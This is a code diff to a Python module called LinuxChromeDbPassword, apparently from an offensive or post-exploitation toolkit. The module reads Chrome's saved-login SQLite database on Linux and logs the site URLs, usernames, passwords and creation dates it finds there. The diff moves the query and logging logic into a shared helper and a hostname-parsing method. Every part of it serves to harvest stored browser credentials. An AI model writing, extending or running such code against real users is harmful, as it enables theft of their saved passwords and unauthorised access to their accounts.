@@ -15,7 +15,7 @@ class LinuxChromeDbPassword(ChromeModule):
 		ChromeModule.__init__(
 			self,
 			name='LinuxChromeDbPassword',
-			version='0.1.0',
+			version='0.1.1',
 			file=__file__,
 			dependencies=['os', 'sqlite3', 'urllib.parse'],
 		)
@@ -36,29 +36,17 @@ class LinuxChromeDbPassword(ChromeModule):
 				self.log(profile.split('/')[-1] + ':')
 				connection = sqlite3.connect(download_path)
 				cursor = connection.cursor()
-				try:
-					cursor.execute('SELECT origin_url, username_value, password_value, date_created FROM logins WHERE blacklisted_by_user = 0')
-				except sqlite3.OperationalError:
-					self.executenot(download_path + ' database is locked', 1)
-					return False
 
-				self.log('hostname,username,password,created_date')
-				for origin_url, username_value, password_value, date_created in cursor.fetchall():
-					hostname_split = parse.urlsplit(origin_url)
-					hostname = parse.urlunsplit((hostname_split.scheme, hostname_split.netloc, "", "", ""))
-					self.log(hostname + ',' + username_value + ',' + password_value + ',' + str(date_created))
+				self.cursor_get_and_log(cursor, 'origin_url,username_value,password_value,date_created',
+										'logins WHERE blacklisted_by_user = 0', decrypt_ids=[0],
+										decrypt_algo=self.parse_hostname, spe=os.path.split(profile)[1])
 
-				cursor = connection.cursor()
-				try:
-					cursor.execute('SELECT origin_url, date_created FROM logins WHERE blacklisted_by_user = 1')
-				except sqlite3.OperationalError:
-					self.executenot(download_path + ' database is locked', 1)
-					return False
-
-				self.log('hostname,created_date,blacklisted')
-				for origin_url, date_created in cursor.fetchall():
-					hostname_split = parse.urlsplit(origin_url)
-					hostname = parse.urlunsplit((hostname_split.scheme, hostname_split.netloc, "", "", ""))
-					self.log(hostname + ',' + str(date_created) + ',blacklisted')
-
+				self.cursor_get_and_log(cursor, 'origin_url,date_created',
+										'logins WHERE blacklisted_by_user = 1', decrypt_ids=[0],
+										decrypt_algo=self.parse_hostname, spe=os.path.split(profile)[1])
 		return True
+
+	@staticmethod
+	def parse_hostname(origin):
+		hostname_split = parse.urlsplit(origin)
+		return parse.urlunsplit((hostname_split.scheme, hostname_split.netloc, "", "", ""))
